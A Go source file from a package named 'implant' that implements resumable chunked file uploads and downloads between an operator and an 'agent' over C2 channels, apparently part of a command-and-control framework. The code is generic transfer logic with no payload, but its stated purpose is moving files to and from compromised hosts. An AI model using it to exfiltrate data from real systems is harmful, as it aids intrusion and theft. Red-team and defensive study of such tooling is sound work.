package implant

import (
	"crypto/sha256"
	"fmt"
	"io"
	"os"
	"sync"
)

// ══════════════════════════════════════════
//  RESUMABLE CHUNKED FILE TRANSFERS
// ══════════════════════════════════════════
// Large files are split into chunks for reliable transfer over
// unstable C2 channels. State is tracked so transfers can resume
// after agent reconnection or network interruption.

const DefaultChunkSize = 4 * 1024 * 1024 // 4MB chunks

// TransferState tracks an in-progress file transfer.
type TransferState struct {
	ID          string `json:"id"`
	Filename    string `json:"filename"`
	RemotePath  string `json:"remote_path"`
	TotalSize   int64  `json:"total_size"`
	Transferred int64  `json:"transferred"`
	TotalChunks int    `json:"total_chunks"`
	ChunksDone  int    `json:"chunks_done"`
	ChunkSize   int    `json:"chunk_size"`
	Direction   string `json:"direction"` // "upload" or "download"
	Checksum    string `json:"checksum"`
	Complete    bool   `json:"complete"`
	Error       string `json:"error,omitempty"`
	mu          sync.Mutex `json:"-"` // Protects file write operations
}

// TransferManager manages chunked file transfers.
type TransferManager struct {
	mu        sync.RWMutex
	transfers map[string]*TransferState
}

var transferMgr = &TransferManager{transfers: make(map[string]*TransferState)}

// ChunkedUpload reads a local file and returns chunks for sending to the agent.
func ChunkedUpload(localPath, remotePath string, chunkSize int) (*TransferState, [][]byte, error) {
	if chunkSize <= 0 {
		chunkSize = DefaultChunkSize
	}

	f, err := os.Open(localPath)
	if err != nil {
		return nil, nil, fmt.Errorf("cannot open file: %w", err)
	}
	defer f.Close()

	info, _ := f.Stat()
	totalSize := info.Size()
	totalChunks := int(totalSize/int64(chunkSize)) + 1

	// Calculate checksum
	hasher := sha256.New()
	f.Seek(0, 0)
	io.Copy(hasher, f)
	checksum := fmt.Sprintf("%x", hasher.Sum(nil))

	// Read chunks
	f.Seek(0, 0)
	var chunks [][]byte
	for {
		chunk := make([]byte, chunkSize)
		n, err := f.Read(chunk)
		if n > 0 {
			chunks = append(chunks, chunk[:n])
		}
		if err == io.EOF {
			break
		}
		if err != nil {
			return nil, nil, err
		}
	}

	state := &TransferState{
		ID:          fmt.Sprintf("tx-%d", len(transferMgr.transfers)+1),
		Filename:    info.Name(),
		RemotePath:  remotePath,
		TotalSize:   totalSize,
		TotalChunks: totalChunks,
		ChunkSize:   chunkSize,
		Direction:   "upload",
		Checksum:    checksum[:16],
	}

	transferMgr.mu.Lock()
	transferMgr.transfers[state.ID] = state
	transferMgr.mu.Unlock()

	return state, chunks, nil
}

// ChunkedDownload receives chunks from the agent and writes to a local file.
func ChunkedDownload(localPath string, totalSize int64, checksum string) (*TransferState, error) {
	state := &TransferState{
		ID:          fmt.Sprintf("rx-%d", len(transferMgr.transfers)+1),
		Filename:    localPath,
		RemotePath:  localPath,
		TotalSize:   totalSize,
		Direction:   "download",
		Checksum:    checksum,
		ChunkSize:   DefaultChunkSize,
		TotalChunks: int(totalSize/int64(DefaultChunkSize)) + 1,
	}

	transferMgr.mu.Lock()
	transferMgr.transfers[state.ID] = state
	transferMgr.mu.Unlock()

	return state, nil
}

// WriteChunk writes a received chunk to the download file.
// Thread-safe: uses mutex to protect file writes and state updates.
func WriteChunk(transferID string, chunkIdx int, data []byte) error {
	transferMgr.mu.Lock()
	state, ok := transferMgr.transfers[transferID]
	transferMgr.mu.Unlock()
	if !ok {
		return fmt.Errorf("transfer %s not found", transferID)
	}

	// Use state-level mutex for thread-safe file writes
	state.mu.Lock()
	defer state.mu.Unlock()

	f, err := os.OpenFile(state.Filename, os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return err
	}
	defer f.Close()

	offset := int64(chunkIdx) * int64(state.ChunkSize)
	if _, err := f.WriteAt(data, offset); err != nil {
		return fmt.Errorf("write chunk %d failed: %w", chunkIdx, err)
	}
	if err := f.Sync(); err != nil {
		return fmt.Errorf("sync chunk %d failed: %w", chunkIdx, err)
	}

	state.ChunksDone++
	state.Transferred += int64(len(data))
	if state.ChunksDone >= state.TotalChunks {
		state.Complete = true
	}

	return nil
}

// GetTransferProgress returns the current state of all transfers.
func GetTransferProgress() []TransferState {
	transferMgr.mu.RLock()
	defer transferMgr.mu.RUnlock()
	var result []TransferState
	for _, t := range transferMgr.transfers {
		result = append(result, *t)
	}
	return result
}

// CleanupCompletedTransfers removes finished transfers from memory.
func CleanupCompletedTransfers() int {
	transferMgr.mu.Lock()
	defer transferMgr.mu.Unlock()
	cleaned := 0
	for id, t := range transferMgr.transfers {
		if t.Complete || t.Error != "" {
			delete(transferMgr.transfers, id)
			cleaned++
		}
	}
	return cleaned
}
